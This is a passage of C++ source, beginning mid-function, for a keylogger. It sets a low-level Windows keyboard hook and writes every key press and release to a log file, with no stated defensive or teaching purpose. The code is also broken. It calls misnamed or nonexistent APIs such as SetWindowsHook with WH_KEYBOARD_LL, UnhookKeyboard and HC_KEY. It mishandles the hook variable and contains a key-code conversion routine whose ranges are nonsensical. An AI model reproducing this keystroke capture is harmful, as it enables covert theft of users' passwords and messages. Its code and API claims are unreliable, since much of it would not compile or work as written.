            return 1;
        }
    }
    return 0;
}

void StartKeyboardHook() {
    // Define the callback function
    HHOOK hook = SetWindowsHook(WH_KEYBOARD_LL, KeyPress);

    if (!hook) {
        cout << "Error: Failed to set keyboard hook." << endl;
        return;
    }

    // Register the callback
    hook = hook;
}

void StopKeyboardHook() {
    if (hook) {
        UnhookKeyboard(hook);
        hook = NULL;
    }
}

void KeyPress(HANDLE hwnd, int nCode, DWORD state, int shiftState) {
    // Check if the event is a keyboard event
    if (nCode == HC_KEY) {
        // Get the key that was pressed or released
        char key = GetKey(nCode);
        // Determine if the key is pressed (down) or released (up)
        bool isKeyDown = (state == 0x00000001L) ? true : false;
        // Record the keystroke
        RecordKeystroke(key, isKeyDown);
    }
}

void RecordKeystroke(string key, bool isPressed) {
    // Append to the log file
    keystrokeLog << key << (isPressed ? " down" : " up");
    keystrokeLog << endl;
}

// Function to get the corresponding character from the key code
char GetKey(int nCode) {
    char key;
    if (nCode >= 0x30 && nCode <= 0xD1) {
        key = '0' + nCode;
    } else if (nCode >= 0x40 && nCode <= 0x5A) {
        key = (nCode == 0x40) ? '`' : (nCode - 0x40 + 0x00C0);
    } else if (nCode >= 0x5B && nCode <= 0x5F) {
        key = (nCode - 0x5B + 0x00C0);
    } else if (nCode >= 0x60 && nCode <= 0x7E) {
        key = (nCode - 0x60);
    }
    return key;
}
```

